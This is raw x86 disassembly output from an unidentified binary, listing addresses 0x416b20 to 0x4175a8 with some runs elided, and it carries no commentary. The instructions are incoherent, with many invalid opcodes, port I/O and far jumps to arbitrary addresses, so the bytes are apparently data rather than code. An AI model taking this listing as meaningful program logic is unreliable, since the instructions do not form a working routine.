  416b20:	lahf   
  416b21:	mov    eax,0x803b77bf
  416b26:	aaa    
  416b27:	add    DWORD PTR [edx],esp
  416b29:	mov    edx,0xa930758a
  416b2e:	mov    bh,0x53
  416b30:	xchg   di,ax
  416b32:	iret   
  416b33:	mov    DWORD PTR [esi+0x27388b3b],0x34abe9a9
  416b3d:	or     BYTE PTR [ebp-0x57],bl
  416b40:	mov    edx,0x79017194
  416b45:	in     al,dx
  416b46:	dec    ebx
  416b47:	dec    edi
  416b48:	inc    edi
  416b49:	mov    ecx,DWORD PTR ds:0x9d496e7f
  416b4f:	xor    BYTE PTR [ebx+ebp*8-0x2c7e37c9],dl
  416b56:	bound  ebp,QWORD PTR [eax-0x210a31e]
  416b5c:	xor    al,0xe
  416b5e:	pop    edi
  416b5f:	mov    cl,0x61
  416b61:	(bad)  
  416b62:	out    dx,eax
  416b63:	mov    es,WORD PTR [ebx+edi*8+0x49d7e3ce]
  416b6a:	dec    esi
  416b6b:	(bad)  
  416b6c:	test   eax,0x2915bddf
  416b71:	add    BYTE PTR [ebp-0x522de276],bh
  416b77:	lods   al,BYTE PTR ds:[esi]
  416b78:	adc    ah,BYTE PTR [ecx+0x7035ee0c]
  416b7e:	(bad)  
  416b80:	cmp    BYTE PTR [ebp-0x5b],cl
  416b83:	mov    al,0xa7
  416b85:	pop    esi
  416b86:	ds and al,0xce
  416b89:	fcom   QWORD PTR [edi-0x56]
  416b8c:	popf   
  416b8d:	push   0x5655e37
  416b92:	fwait
  416b93:	jns    0x416bdf
  416b95:	sub    DWORD PTR [esi],edi
  416b97:	cmp    BYTE PTR [edx],ch
  416b99:	pop    ds
  416b9a:	fwait
  416b9b:	out    dx,eax
  416b9c:	add    BYTE PTR [eax-0x3ad439a9],dh
  416ba2:	stc    
  416ba3:	or     DWORD PTR [esi+0x71],ebp
  416ba6:	(bad)  
  416ba7:	jb     0x416b31
  416ba9:	inc    esp
  416baa:	dec    esp
  416bab:	adc    edi,ebp
  416bad:	in     eax,dx
  416bae:	dec    ecx
  416baf:	pop    esi
  416bb0:	push   ebx
  416bb1:	add    DWORD PTR es:[ebp+0x20aaf197],ecx
  416bb8:	inc    esp
  416bb9:	jbe    0x416b74
  416bbb:	and    edi,DWORD PTR [esi-0x6a]
  416bbe:	mov    ah,0xbe
  416bc0:	mov    ?,WORD PTR ds:[edx]
  416bc3:	xor    DWORD PTR [edx],edx
  416bc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bc6:	stos   BYTE PTR es:[edi],al
  416bc7:	sub    bl,BYTE PTR [eax]
  416bc9:	jae    0x416b77
  416bcb:	mov    ch,0x34
  416bcd:	inc    esi
  416bce:	jnp    0x416b56
  416bd0:	mov    bl,0xa2
  416bd2:	xchg   edx,eax
  416bd3:	xor    ah,0x5e
  416bd6:	inc    edx
  416bd7:	push   es
  416bd8:	xchg   ecx,eax
  416bd9:	pop    es
  416bda:	data16 (bad) 
  416bdc:	xchg   ecx,eax
  416bdd:	xchg   edx,ebp
  416bdf:	je     0x416c01
  416be1:	and    bh,BYTE PTR [edi]
  416be3:	lods   eax,DWORD PTR fs:[esi]
  416be5:	jp     0x416c2f
  416be7:	sub    esi,DWORD PTR [edx+0x361bd2f7]
  416bed:	inc    edx
	...
  416c56:	jecxz  0x416cbd
  416c58:	push   cs
  416c59:	test   DWORD PTR [esi-0x38a0401],0xed5b70a9
  416c63:	xchg   BYTE PTR [esp+eiz*4+0xf567],cl
  416c6a:	add    BYTE PTR [ecx],al
  416c6c:	add    BYTE PTR [eax],al
  416c6e:	mov    edi,0x5445d511
  416c73:	mov    ebp,0x72916596
  416c78:	sbb    eax,0x66399db9
  416c7d:	add    ebp,DWORD PTR [ecx+eiz*4+0x4b7e393b]
  416c84:	sub    edi,DWORD PTR [edi]
  416c86:	dec    esi
  416c87:	sbb    esi,DWORD PTR [edi]
  416c89:	(bad)  
  416c8a:	pop    ebx
  416c8b:	pop    ebp
  416c8c:	repnz test BYTE PTR [ebx],0xba
  416c90:	adc    BYTE PTR [esi+eax*2-0x57],ah
  416c94:	and    eax,edx
  416c96:	in     eax,dx
  416c97:	popa   
  416c98:	mov    al,ds:0xc533d2a7
  416c9d:	xchg   ebp,eax
  416c9e:	push   DWORD PTR [edi]
  416ca0:	rcr    BYTE PTR [ecx+0xe],1
  416ca3:	dec    edx
  416ca4:	fwait
  416ca5:	push   ds
  416ca6:	aam    0x73
  416ca8:	mov    cl,0x7a
  416caa:	push   ds
  416cab:	xchg   esp,eax
  416cac:	leave  
  416cad:	and    DWORD PTR gs:[eax-0x43cae3e6],0x7e
  416cb5:	mov    dl,bl
  416cb7:	push   esp
  416cb8:	fist   WORD PTR [esi+0xa3dd93]
  416cbe:	mov    dh,0x56
  416cc0:	xchg   ebp,eax
  416cc1:	repnz int3 
  416cc3:	sub    ch,BYTE PTR [esi-0x46]
  416cc6:	out    dx,al
  416cc7:	imul   edx,DWORD PTR [bx+di-0x55c5],0x11
  416ccd:	push   edi
  416cce:	shl    eax,1
  416cd0:	repz push ebx
  416cd2:	clc    
  416cd3:	mov    esp,0x48a7bb4e
  416cd8:	inc    ecx
  416cd9:	in     eax,0x17
  416cdb:	sti    
  416cdc:	cmp    eax,0xc7718fcf
  416ce1:	push   es
  416ce2:	inc    edi
  416ce3:	cmp    bl,dl
  416ce5:	inc    edi
  416ce6:	push   esi
  416ce7:	mov    al,ds:0xac0c801a
  416cec:	repz mov ds:0x8725d2c,eax
  416cf2:	dec    ebx
  416cf3:	inc    esp
  416cf4:	cli    
  416cf5:	in     eax,dx
  416cf6:	daa    
  416cf7:	mov    eax,0x33415ba7
  416cfc:	addr16 mov esi,0x2b4f81ed
  416d02:	stos   BYTE PTR es:[edi],al
  416d03:	mov    edi,0xe4d6eaba
  416d08:	jl     0x416cf6
  416d0a:	arpl   bx,di
  416d0c:	add    DWORD PTR [ebx-0x51],esi
  416d0f:	mov    dh,0x15
  416d11:	aas    
  416d12:	fisttp QWORD PTR [ecx+esi*1+0x35]
  416d16:	and    ebx,eax
  416d18:	out    0x15,eax
  416d1a:	inc    eax
  416d1b:	ins    BYTE PTR es:[edi],dx
  416d1c:	iret   
  416d1d:	imul   ebp,DWORD PTR es:[ebx-0x1f],0xa8bad547
  416d25:	int3   
  416d26:	mov    ds:0x534fdbcd,al
  416d2b:	test   ebx,edx
  416d2d:	cmp    esi,DWORD PTR [eax+0x754bc0bc]
  416d33:	pop    esi
  416d34:	cwde   
  416d35:	pop    edx
  416d36:	clc    
  416d37:	cmp    al,0x98
  416d39:	test   BYTE PTR [edi+0x72],0x8b
  416d3d:	dec    edx
  416d3e:	push   edi
  416d3f:	pop    ebp
  416d40:	imul   esp,DWORD PTR [ebx+eax*2+0x70224566],0xa172ec39
  416d4b:	adc    BYTE PTR [ebp+eiz*8-0x3c615f74],0x6e
  416d53:	adc    al,al
  416d55:	sbb    DWORD PTR [edx],edi
  416d57:	fchs   
  416d59:	sbb    esp,DWORD PTR [ecx+esi*8]
  416d5c:	sbb    esp,ebx
  416d5e:	mov    esi,0xaf39709e
  416d63:	jb     0x416d17
  416d65:	jmp    0xd5529fa4
  416d6a:	cmp    eax,0xc842cf
	...
  416dd3:	add    BYTE PTR [eax],al
  416dd5:	add    BYTE PTR [ecx],ah
  416dd7:	xchg   ebx,eax
  416dd8:	mov    DWORD PTR [edi-0x60d84045],ebp
  416dde:	mov    ch,0x99
  416de0:	pop    edx
  416de1:	das    
  416de2:	ins    DWORD PTR es:[edi],dx
  416de3:	cmp    eax,0xf667ae3f
  416de8:	add    BYTE PTR [eax],al
  416dea:	add    BYTE PTR [ecx],al
  416dec:	add    BYTE PTR [eax],al
  416dee:	xor    cl,BYTE PTR [edx+ebx*1]
  416df1:	adc    bh,ah
  416df3:	xchg   edx,eax
  416df4:	mov    edi,0x1be1e5ad
  416df9:	cli    
  416dfa:	sbb    eax,0x3a6d087e
  416dff:	retf   0xcbd2
  416e02:	leave  
  416e03:	rol    BYTE PTR [eax],cl
  416e05:	sbb    bl,BYTE PTR [ecx+0xbd970ba]
  416e0b:	inc    esi
  416e0c:	add    ebx,DWORD PTR [edi+ecx*1-0x31]
  416e10:	test   al,0x97
  416e12:	add    DWORD PTR [eax],ebx
  416e14:	sub    DWORD PTR [esi],edi
  416e16:	mov    dh,0x21
  416e18:	pop    eax
  416e19:	sub    dh,BYTE PTR [ebp-0x1bf96f79]
  416e1f:	pusha  
  416e20:	into   
  416e21:	and    ecx,0xf941e769
  416e27:	(bad)  
  416e28:	pop    es
  416e29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e2a:	(bad)  
  416e2b:	sbb    BYTE PTR [eax-0x5faf70cd],cl
  416e31:	ins    BYTE PTR es:[edi],dx
  416e32:	ja     0x416eaa
  416e34:	fbstp  TBYTE PTR [eax]
  416e36:	hlt    
  416e37:	mov    ebx,0xac430723
  416e3c:	or     DWORD PTR [ecx-0x7fee0ae0],eax
  416e42:	jge    0x416e57
  416e44:	iret   
  416e45:	fwait
  416e46:	mov    DWORD PTR [esi-0x56],edx
  416e49:	jg     0x416e8b
  416e4b:	mov    BYTE PTR [eax],bl
  416e4d:	inc    esi
  416e4e:	loopne 0x416e66
  416e50:	pop    ds
  416e51:	mov    edi,DWORD PTR [edx+0x72]
  416e54:	scas   eax,DWORD PTR es:[edi]
  416e55:	and    al,0xd8
  416e57:	loop   0x416dfa
  416e59:	inc    esi
  416e5a:	inc    esi
  416e5b:	mov    gs,eax
  416e5d:	je     0x416ed4
  416e5f:	test   eax,0x6c5fe8a3
  416e64:	je     0x416e66
  416e66:	sbb    DWORD PTR [ebp-0x66],0xfffffffb
  416e6a:	sbb    eax,0x5a2a2374
  416e6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e70:	fnstsw WORD PTR [edi+ecx*8+0x5f24f8a1]
  416e77:	add    eax,0xbff49eb9
  416e7c:	dec    eax
  416e7d:	mov    ebx,0xdaba9a38
  416e82:	mov    al,ds:0xb6352ec7
  416e87:	pop    ebx
  416e88:	jecxz  0x416e80
  416e8a:	aaa    
  416e8b:	dec    ebp
  416e8c:	sbb    esi,DWORD PTR [ebp-0x58]
  416e8f:	js     0x416e9b
  416e91:	push   esp
  416e92:	push   ebp
  416e93:	not    DWORD PTR ds:0x6e7bde5b
  416e99:	ins    BYTE PTR es:[edi],dx
  416e9a:	(bad)  
  416e9b:	lods   eax,DWORD PTR ds:[esi]
  416e9c:	pop    edx
  416e9d:	pop    es
  416e9e:	inc    esp
  416e9f:	push   edi
  416ea0:	fwait
  416ea1:	in     al,0x9b
  416ea3:	test   eax,0xdcd1b729
  416ea8:	and    al,0xa5
  416eaa:	dec    edx
  416eab:	sbb    DWORD PTR [edx-0x9d194],0xffffffd0
  416eb2:	mov    al,ds:0x8411647a
  416eb7:	cmp    DWORD PTR [eax+eax*1],0xb7bc7e1
  416ebe:	dec    ebx
  416ebf:	jno    0x416eb8
  416ec1:	or     DWORD PTR [ebp+0x4201991c],0xffffff8f
  416ec8:	and    edx,DWORD PTR [edx*2+0x4f4fedee]
  416ecf:	cmc    
  416ed0:	add    DWORD PTR [eax+ecx*1],edi
  416ed3:	or     al,0x7b
  416ed5:	xchg   BYTE PTR [ebx+0x3c9abe96],bh
  416edb:	xchg   ecx,eax
  416edc:	or     DWORD PTR [ebp+0x33],edi
  416edf:	adc    BYTE PTR [edi+0x5fe287b6],ch
  416ee5:	outs   dx,BYTE PTR ds:[esi]
  416ee6:	or     bl,bl
  416ee8:	js     0x416f64
  416eea:	retf   
  416eeb:	test   BYTE PTR [edx+0x7a],ah
	...
  416f55:	add    BYTE PTR [edi-0x519271e7],bh
  416f5b:	(bad)  
  416f5c:	(bad)  
  416f5d:	fucomi st,st(0)
  416f5f:	xor    eax,0x674d8eea
  416f64:	pop    es
  416f65:	pop    es
  416f66:	test   DWORD PTR [bx+si],0x10000
  416f6d:	add    ah,dh
  416f6f:	sbb    al,0xc4
  416f71:	mov    ds:0x348ba9b,eax
  416f76:	push   cs
  416f77:	aas    
  416f78:	mov    bl,0x0
  416f7a:	test   DWORD PTR [esi+0x59f5c691],edi
  416f80:	ret    
  416f81:	mov    WORD PTR [edx+0x220e02e8],?
  416f87:	rcr    DWORD PTR [ebx],cl
  416f89:	js     0x416f4e
  416f8b:	pop    es
  416f8c:	pushf  
  416f8d:	xchg   esi,eax
  416f8e:	(bad)  
  416f8f:	idiv   BYTE PTR [ebx]
  416f91:	mov    edx,0x6dc0f602
  416f96:	xchg   esi,eax
  416f97:	dec    edi
  416f98:	jmp    0xd4f910c8
  416f9d:	loop   0x416f5a
  416f9f:	ss adc al,0xcc
  416fa2:	sub    DWORD PTR [ecx],ecx
  416fa4:	sbb    ch,BYTE PTR [edi]
  416fa6:	gs push ecx
  416fa8:	clc    
  416fa9:	repnz adc DWORD PTR [ecx],ebx
  416fac:	loope  0x416f8d
  416fae:	push   edi
  416faf:	add    DWORD PTR [edx],0xc7532d5b
  416fb5:	es pop ebx
  416fb7:	out    dx,eax
  416fb8:	xchg   ebx,eax
  416fb9:	nop
  416fba:	das    
  416fbb:	test   al,0xd6
  416fbd:	add    DWORD PTR [eax-0x8],ebx
  416fc0:	cmp    ebp,DWORD PTR [edx+ecx*1+0x39]
  416fc4:	xchg   DWORD PTR [ebx+0x10953760],edi
  416fca:	jb     0x417038
  416fcc:	dec    ebx
  416fcd:	push   ebx
  416fce:	and    BYTE PTR [edx-0x7fc7603f],dh
  416fd4:	test   al,0xee
  416fd6:	icebp  
  416fd7:	add    edi,esp
  416fd9:	jmp    0x5e29:0xed186d91
  416fe0:	in     eax,0x89
  416fe2:	add    BYTE PTR [ecx-0x10aa72ba],dh
  416fe8:	jns    0x417033
  416fea:	cmc    
  416feb:	ficomp DWORD PTR [ebp+0x69]
  416fee:	sbb    BYTE PTR ds:0x166d0142,dh
  416ff4:	jno    0x416fd5
  416ff6:	call   0x495cc5ac
  416ffb:	(bad)  
  416ffc:	lods   al,BYTE PTR ds:[esi]
  416ffd:	cli    
  416ffe:	jno    0x416f8a
  417000:	xchg   DWORD PTR [edi],ebp
  417002:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417003:	mov    eax,0x95789837
  417008:	xchg   ebp,eax
  417009:	push   es
  41700a:	popa   
  41700b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41700c:	push   ecx
  41700d:	or     al,0x3f
  41700f:	mov    dl,0x53
  417011:	shr    BYTE PTR [ebp-0x55],cl
  417014:	or     BYTE PTR ds:0x8a6bb68a,bh
  41701a:	popa   
  41701b:	stc    
  41701c:	mov    al,dl
  41701e:	addr16 dec esi
  417020:	xchg   edx,eax
  417021:	jg     0x41704f
  417023:	fcomp  DWORD PTR [ecx-0x27]
  417026:	pushf  
  417027:	sbb    al,bl
  417029:	add    eax,0xcb5f9428
  41702e:	adc    ch,bh
  417030:	sbb    BYTE PTR [eax+ebp*8+0x1263dece],bl
  417037:	pushf  
  417038:	out    dx,eax
  417039:	or     bl,BYTE PTR [esi+edi*8]
  41703c:	xchg   esp,eax
  41703d:	adc    eax,0x87a531a5
  417042:	inc    esi
  417043:	repz cmp eax,0x9a14e553
  417049:	cwde   
  41704a:	lods   al,BYTE PTR ds:[esi]
  41704b:	mov    bh,0x79
  41704d:	ds mov al,0x45
  417050:	out    dx,al
  417051:	adc    eax,0x8a34b6f
  417056:	in     al,0xb0
  417058:	cmp    al,0xb6
  41705a:	fcomi  st,st(0)
  41705c:	sub    eax,0xc8de2739
  417061:	loopne 0x417065
  417063:	repz mov bh,0x91
  417066:	xchg   BYTE PTR [edx],bl
  417068:	mov    eax,0x83114635
  41706d:	hlt    
	...
  4170d6:	jbe    0x417105
  4170d8:	push   ebp
  4170d9:	inc    ecx
  4170da:	pop    edi
  4170db:	jns    0x417153
  4170dd:	aas    
  4170de:	(bad)  
  4170df:	loopne 0x4170d5
  4170e1:	sub    ebp,DWORD PTR [eax+0x67ddf473]
  4170e7:	clc    
  4170e8:	add    BYTE PTR [eax],al
  4170ea:	add    BYTE PTR [ecx],al
  4170ec:	add    BYTE PTR [eax],al
  4170ee:	into   
  4170ef:	cmp    edx,0xd689631b
  4170f5:	xchg   ebx,eax
  4170f6:	sub    edx,DWORD PTR [ebx+0x708af737]
  4170fc:	adc    BYTE PTR [ebp-0x58],al
  4170ff:	test   eax,0x711394fc
  417104:	xchg   BYTE PTR [ecx-0xa],cl
  417107:	pop    ecx
  417108:	iret   
  417109:	retf   0x9705
  41710c:	test   ebp,edx
  41710e:	imul   esp,esp,0x43
  417111:	jae    0x417166
  417113:	push   ebx
  417114:	push   cs
  417115:	xchg   BYTE PTR ds:0xd7867c80,dl
  41711b:	dec    DWORD PTR [eax+ecx*4-0x58]
  41711f:	les    edi,FWORD PTR [edi]
  417121:	mov    DWORD PTR [edi+0x63d12537],esp
  417127:	rcl    DWORD PTR [ecx-0x2d],0x60
  41712b:	mov    ecx,0xc3ef4512
  417130:	dec    ebx
  417131:	cmp    BYTE PTR [esi],bh
  417133:	add    eax,0x14a42d59
  417138:	dec    edi
  417139:	nop
  41713a:	aam    0xd4
  41713c:	xchg   edi,eax
  41713d:	or     eax,0x9c143309
  417142:	test   al,0x42
  417144:	sbb    BYTE PTR [eax+esi*8],dh
  417147:	dec    ecx
  417148:	pop    edi
  417149:	mov    ecx,0x276eae99
  41714e:	rcr    dl,1
  417150:	pushf  
  417151:	mov    WORD PTR [esp+ecx*2],cs
  417154:	in     eax,dx
  417155:	mov    ebx,0x90ff27d0
  41715a:	pop    edx
  41715b:	pop    DWORD PTR [edx+0x46]
  41715e:	inc    DWORD PTR ds:0xf68b4e66
  417164:	loopne 0x417181
  417166:	inc    ecx
  417167:	adc    DWORD PTR [eax+0x6a],edi
  41716a:	das    
  41716b:	ud1    esp,DWORD PTR [edi-0x1a00ec10]
  417172:	addr16 xor dl,cl
  417175:	mov    ds:0x3febb749,al
  41717a:	dec    ebx
  41717b:	add    dl,BYTE PTR [edi-0x17]
  41717e:	xchg   edx,eax
  41717f:	loop   0x417162
  417181:	push   es
  417182:	scas   eax,DWORD PTR es:[edi]
  417183:	pop    ss
  417184:	out    dx,eax
  417185:	repz inc ebp
  417187:	dec    ebx
  417188:	add    eax,0x3c5ceaeb
  41718d:	sbb    BYTE PTR [ebp-0x41850b51],0x55
  417194:	in     al,0xaa
  417196:	out    dx,al
  417197:	call   0x3e5f:0x149f5bb3
  41719e:	cmp    cl,bh
  4171a0:	or     esi,DWORD PTR es:[edx+eiz*2-0x7b]
  4171a5:	fcmove st,st(4)
  4171a7:	and    eax,0x73225121
  4171ac:	adc    edi,ecx
  4171ae:	xor    BYTE PTR [edi],ch
  4171b0:	inc    edi
  4171b1:	lods   eax,DWORD PTR ds:[esi]
  4171b2:	shr    BYTE PTR [eax-0x6a023841],0x13
  4171b9:	xor    eax,0xb8d47037
  4171be:	cmp    esp,DWORD PTR [ecx+0x3c]
  4171c1:	in     al,dx
  4171c2:	mov    edx,0x2777aeea
  4171c7:	and    BYTE PTR [esi-0x19],ch
  4171ca:	sub    eax,0xaab09a4e
  4171cf:	cdq    
  4171d0:	in     eax,0x3c
  4171d2:	mov    ds:0xcd541933,eax
  4171d7:	cmp    al,0x3f
  4171d9:	out    0x78,al
  4171db:	or     al,0x6
  4171dd:	and    DWORD PTR [edx],ebp
  4171df:	pop    ss
  4171e0:	test   eax,0x6d3fe6f5
  4171e5:	add    al,0x48
  4171e7:	pop    eax
  4171e8:	adc    dl,BYTE PTR [eax-0x47]
  4171eb:	add    eax,0xe7be
	...
  417254:	add    BYTE PTR [eax],al
  417256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417257:	sbb    DWORD PTR [eax+0x1a],esi
  41725a:	(bad)  
  41725b:	jnp    0x41724b
  41725d:	mov    ebp,0x986526a4
  417262:	das    
  417263:	(bad)  
  417264:	sbb    cl,BYTE PTR [edi+0x67]
  417267:	stc    
  417268:	add    BYTE PTR [eax],al
  41726a:	add    BYTE PTR [ecx],al
  41726c:	add    BYTE PTR [eax],al
  41726e:	push   esi
  41726f:	push   0x16
  417271:	ret    
  417272:	mov    dh,BYTE PTR [edx]
  417274:	mov    ebx,0x16cd47f8
  417279:	push   esp
  41727a:	out    0xb0,eax
  41727c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41727d:	or     al,0x4d
  41727f:	dec    edi
  417280:	push   ds
  417281:	inc    ebp
  417282:	(bad)  
  417283:	cli    
  417284:	(bad)  
  417285:	mov    bh,0x7e
  417287:	push   ds
  417288:	call   0x366b13f0
  41728d:	fdivr  QWORD PTR [esi+ebp*1]
  417290:	std    
  417291:	jg     0x417284
  417293:	ins    BYTE PTR es:[edi],dx
  417294:	imul   BYTE PTR [edi]
  417296:	cmp    dh,al
  417298:	jb     0x4172fd
  41729a:	mov    ebp,0xc708e5a5
  41729f:	test   BYTE PTR [ecx-0x18fcb0ea],0xd3
  4172a6:	test   al,0x87
  4172a8:	or     eax,0x142c3dbb
  4172ad:	es pushf 
  4172af:	jnp    0x417238
  4172b1:	cmp    bh,ch
  4172b3:	push   esi
  4172b4:	loopne 0x41731e
  4172b6:	das    
  4172b7:	xchg   ecx,eax
  4172b8:	hlt    
  4172b9:	cmp    esi,0x1a2b1c1
  4172bf:	cwde   
  4172c0:	fisttp DWORD PTR [eax]
  4172c2:	test   BYTE PTR [esi+0x56],ah
  4172c5:	test   al,0x88
  4172c7:	push   cs
  4172c8:	and    eax,ebp
  4172ca:	fsubrp st(0),st
  4172cc:	xchg   esi,eax
  4172cd:	imul   esp,DWORD PTR [edi-0x71700f8f],0x1fb1f2bc
  4172d7:	out    0x58,al
  4172d9:	inc    ebx
  4172da:	or     DWORD PTR [eax-0x3055e1d1],ebp
  4172e0:	test   DWORD PTR [eax],edi
  4172e2:	loope  0x4172df
  4172e4:	jp     0x41733d
  4172e6:	popf   
  4172e7:	cmp    ebx,DWORD PTR [eax]
  4172e9:	push   eax
  4172ea:	dec    esi
  4172eb:	jge    0x417310
  4172ed:	pop    ds
  4172ee:	inc    ecx
  4172ef:	add    DWORD PTR [edi],edi
  4172f1:	(bad)  [eax+edi*8-0x76]
  4172f5:	pop    ss
  4172f6:	out    dx,al
  4172f7:	xchg   ebx,eax
  4172f8:	lea    edx,[ebx+0x47]
  4172fb:	inc    ebx
  4172fc:	push   es
  4172fd:	popa   
  4172fe:	ret    
  4172ff:	(bad)  
  417300:	pop    ds
  417301:	dec    esp
  417302:	add    edi,DWORD PTR [edi+0x11]
  417305:	aaa    
  417306:	cmp    BYTE PTR [ebx],ch
  417308:	data16 in al,dx
  41730a:	inc    ecx
  41730b:	xor    DWORD PTR [ebx+0x19412d36],0x40
  417312:	push   edx
  417313:	adc    dl,BYTE PTR [ebx+0x6ae0cd00]
  417319:	mov    bh,0x18
  41731b:	push   ebp
  41731c:	aad    0x96
  41731e:	jmp    0x417337
  417320:	xchg   si,ax
  417322:	sbb    al,0x1b
  417324:	scas   eax,DWORD PTR es:[edi]
  417325:	loop   0x417353
  417327:	sbb    BYTE PTR [esi+0x24],ah
  41732a:	adc    BYTE PTR [ecx+eax*4],dl
  41732d:	or     ebx,DWORD PTR [ebx-0x475a9e35]
  417333:	lods   eax,DWORD PTR ds:[esi]
  417334:	aaa    
  417335:	ret    0xfcce
  417338:	jle    0x417303
  41733a:	ins    DWORD PTR es:[edi],dx
  41733b:	xchg   ebp,eax
  41733c:	outs   dx,BYTE PTR ds:[esi]
  41733d:	jno    0x4172e9
  41733f:	(bad)  
  417340:	push   ss
  417341:	mov    BYTE PTR [edx],ah
  417343:	inc    ecx
  417344:	mov    al,ds:0x55f620b3
  417349:	adc    ebp,DWORD PTR [edx-0x77]
  41734c:	outs   dx,DWORD PTR ds:[esi]
  41734d:	stos   DWORD PTR es:[edi],eax
  41734e:	mov    edi,0x72986fd0
  417353:	xchg   esi,eax
  417354:	and    ebx,DWORD PTR [esi+ecx*4+0x55399522]
  41735b:	mov    dh,0x91
  41735d:	std    
  41735e:	mov    al,ds:0x1e954df2
  417363:	mov    ebx,0xd434a0e
  417368:	mov    ecx,0xadf6d829
  41736d:	adc    al,BYTE PTR [eax]
	...
  4173d3:	add    BYTE PTR [eax],al
  4173d5:	add    BYTE PTR [ecx-0x44],ch
  4173d8:	xlat   BYTE PTR ds:[ebx]
  4173d9:	pop    esi
  4173da:	xlat   BYTE PTR ds:[ebx]
  4173db:	jg     0x4173c6
  4173dd:	mov    edi,0x6508016b
  4173e2:	xchg   edx,eax
  4173e3:	inc    edi
  4173e4:	aaa    
  4173e5:	frstor [edi-0x6]
  4173e8:	add    BYTE PTR [eax],al
  4173ea:	add    BYTE PTR [ecx],al
  4173ec:	add    BYTE PTR [eax],al
  4173ee:	add    edi,0x5b7c3bb6
  4173f4:	sub    BYTE PTR [eax+ecx*4],0x42
  4173f8:	lock pop es
  4173fa:	imul   edi,DWORD PTR [ebx],0xffffffc9
  4173fd:	ret    
  4173fe:	call   0x39691301
  417403:	add    eax,0x85b88a5f
  417408:	loop   0x417479
  41740a:	sub    DWORD PTR [eax-0x50],ebx
  41740d:	in     al,dx
  41740e:	xchg   ecx,eax
  41740f:	fst    QWORD PTR [edx]
  417411:	rol    BYTE PTR [ebp-0x76],0x79
  417415:	ret    
  417416:	sbb    BYTE PTR [edx],dh
  417418:	test   BYTE PTR [eax],bl
  41741a:	push   esp
  41741b:	(bad)  
  41741c:	aam    0xc3
  41741e:	lea    esp,[ebp+0x6f3ca7cb]
  417424:	js     0x417481
  417426:	popf   
  417427:	iret   
  417428:	push   esp
  417429:	sub    dl,BYTE PTR ds:0x931c0db8
  41742f:	mov    dh,BYTE PTR [edx+ecx*1+0x74882c72]
  417436:	mov    ecx,0x15c00caa
  41743b:	sub    al,0xe
  41743d:	xor    BYTE PTR [ebx+0x4e],0x23
  417441:	fsub   DWORD PTR [di]
  417445:	add    eax,0x63138de3
  41744a:	sbb    BYTE PTR [edi+ecx*2+0x1a],dl
  41744e:	adc    esp,DWORD PTR [eax]
  417450:	adc    DWORD PTR [ebp-0x60],esp
  417453:	outs   dx,BYTE PTR ds:[esi]
  417454:	(bad)  
  417456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417457:	cs mov edx,0x9fbf791f
  41745d:	outs   dx,DWORD PTR ds:[esi]
  41745e:	fs xchg esi,eax
  417460:	clc    
  417461:	jmp    0xa5dc:0x5588fcd
  417468:	cmc    
  417469:	out    0xe,eax
  41746b:	add    DWORD PTR [edi+0x3d4ad5cc],eax
  417471:	mov    ecx,0x9b15b562
  417476:	jmp    esp
  417478:	push   eax
  417479:	loopne 0x4174ac
  41747b:	sub    BYTE PTR [esi-0x72],bh
  41747e:	inc    BYTE PTR [esi-0x41]
  417481:	cmp    bl,BYTE PTR [ebp+edi*8+0x11]
  417485:	jle    0x417479
  417487:	jle    0x417508
  417489:	dec    ebp
  41748a:	xor    eax,0x2f233b3e
  41748f:	jp     0x417479
  417491:	scas   al,BYTE PTR es:[edi]
  417492:	push   edx
  417493:	inc    ecx
  417494:	ret    
  417495:	cmp    al,0x55
  417497:	test   eax,0x9497f4c6
  41749c:	fld    TBYTE PTR [ebx+ebp*2]
  41749f:	jmp    0xaaa3:0x788e56b6
  4174a6:	int    0xcd
  4174a8:	(bad)  
  4174a9:	and    DWORD PTR [ebx+0x44ee038],esi
  4174af:	and    edx,DWORD PTR [edx]
  4174b1:	out    dx,eax
  4174b2:	mov    esp,0x56a08f52
  4174b7:	mov    ecx,0x439d41a5
  4174bc:	or     eax,0x9b47240d
  4174c1:	mov    cl,0x7b
  4174c3:	mov    cl,0xb8
  4174c5:	xor    al,0x2c
  4174c7:	(bad)  
  4174c8:	cmp    al,0xc4
  4174ca:	xchg   ebp,eax
  4174cb:	push   edx
  4174cc:	and    cl,ch
  4174ce:	jbe    0x417463
  4174d0:	ja     0x41751f
  4174d2:	xchg   esp,eax
  4174d3:	ror    ecx,cl
  4174d5:	mov    ah,0x7d
  4174d7:	lds    esp,FWORD PTR [eax]
  4174d9:	retf   
  4174da:	es das 
  4174dc:	push   0x2b
  4174de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174df:	pusha  
  4174e0:	cmp    esi,ebx
  4174e2:	aaa    
  4174e3:	mov    cl,0x77
  4174e5:	pop    ss
  4174e6:	js     0x41751e
  4174e8:	rol    BYTE PTR [edx+0x78],0x6
  4174ec:	mov    bh,al
	...
  417556:	xchg   ecx,eax
  417557:	mov    edx,0xdc6b0c6a
  41755c:	idiv   DWORD PTR [edi+0x212a686b]
  417562:	sbb    DWORD PTR [eax-0x1],ebx
  417565:	cdq    
  417566:	addr16 sti 
  417568:	add    BYTE PTR [eax],al
  41756a:	add    BYTE PTR [ecx],al
  41756c:	add    BYTE PTR [eax],al
  41756e:	jmp    DWORD PTR [esi-0x37ae9806]
  417574:	jae    0x417535
  417576:	sub    al,0x77
  417578:	push   0x20
  41757a:	jns    0x417556
  41757c:	pusha  
  41757d:	leave  
  41757e:	pop    ecx
  41757f:	fnstenv [esi+esi*8]
  417582:	sub    al,BYTE PTR [ebx+0x6c]
  417585:	xchg   ebp,eax
  417586:	shr    DWORD PTR [edx-0x29],1
  417589:	sar    ecx,0x21
  41758c:	jno    0x417514
  41758e:	add    BYTE PTR [ebx-0x6b6077ba],bl
  417594:	cmp    al,0x84
  417596:	sub    edx,DWORD PTR [ebx]
  417598:	daa    
  417599:	push   ebp
  41759a:	or     al,0xda
  41759c:	int3   
  41759d:	push   0x31fa53fe
  4175a2:	cs inc esp
  4175a4:	xor    ebx,DWORD PTR [ebx+ebp*8-0x2f]
  4175a8:	push   ss
